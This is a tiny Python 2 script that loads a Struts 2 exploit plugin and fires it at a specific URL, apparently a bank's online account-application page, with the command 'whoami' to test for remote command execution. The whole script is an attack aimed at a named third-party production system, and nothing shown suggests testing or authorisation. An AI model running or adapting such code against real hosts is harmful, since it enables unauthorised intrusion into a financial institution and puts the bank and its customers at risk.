from plugins.struts2 import struts2


xpl = struts2()
url = 'https://banking.nbarizona.com/zap/ApplicantInformationPrimary.action'
print xpl.exploit(url,'whoami')
